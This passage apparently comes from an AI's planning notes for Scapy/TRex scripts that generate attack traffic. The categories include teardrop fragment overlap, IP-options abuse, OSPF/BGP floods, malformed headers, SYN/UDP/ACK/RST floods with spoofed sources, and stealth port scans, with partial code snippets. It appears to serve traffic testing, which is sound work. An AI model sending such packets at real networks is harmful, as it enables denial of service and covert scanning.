t=DST_IP, flags=0, frag=(1480//8), proto=1)/Raw(load=payload[1472:])\n    return [p1, p2]\n```\n\nHmm ICMP header included in first fragment. proto=1. OK.\n\nActually building fragment with ICMP layer then Raw should include ICMP header in first frag. Good.\n\nI'll create two streams, each continuous.\n\nLet me write.\n\nScript 3: cat_ip_frag_overlap.py - teardrop overlapping fragments.\n\n```python\np1 = Ether()/IP(dst=DST_IP, flags='MF', frag=0)/TCP(sport=...)/Raw(b'A'*16)\np2 = Ether()/IP(dst=DST_IP, flags='MF', frag=1)/Raw(b'B'*24)  # offset 8 -> overlaps\np3 = Ether()/IP(dst=DST_IP, flags=0, frag=2)/Raw(b'C'*16)\n```\n\nOK.\n\nNow group 2.\n\nScript 4: cat_ip_options_abuse.py - malformed IP options / timestamp/record route flood.\n\n```python\nbase = Ether()/IP(dst=DST_IP, options=b'\\x44'*40)/UDP(sport=1234, dport=53)/Raw(b'X'*8)\n```\nOption type 0x44 = timestamp. 40 bytes options → header 60 bytes. Good.\n\nScript 5: cat_routing_proto_flood.py - OSPF hello flood + BGP.\n\nOSPF: `Ether()/IP(dst='224.0.0.5', proto=89)/Raw(ospf_hello_bytes)`.\nBGP: `Ether()/IP(dst=DST_IP)/TCP(sport=179, dport=179, flags='PA')/Raw(bgp_bytes)`.\n\nI'll craft minimal OSPF hello bytes.\n\n```python\nospf_hello = bytes([\n    0x02, 0x01, 0x00, 0x2c,  # version 2, type 1 (hello), len 44\n    ...\n])\n```\n\nLet me just make a plausible 44-byte block.\n\nScript 6: cat_l3_bad_checksum.py - malformed headers: bad IP checksum, bad length, TTL=0, reserved flags.\n\n```python\nbase = Ether()/IP(dst=DST_IP, chksum=0x1234, ttl=0, len=9999)/TCP(...)\n```\n\nNow group 3.\n\nScript 7: cat_tcp_syn_flood.py - SYN flood with random src ip + random sport.\n\nScript 8: cat_udp_flood.py - UDP flood random ports, random payload.\n\nScript 9: cat_tcp_ack_flood.py - ACK flood, random seq/ack.\n\nGroup 4.\n\nScript 10: cat_tcp_rst_flood.py - RST flood.\n\nScript 11: cat_tcp_scan_stealth.py - XMAS/NULL/FIN scans across ports (port range VM).\n\nFor port scan: use STLVmFlowVar for dport with op=\"inc\" and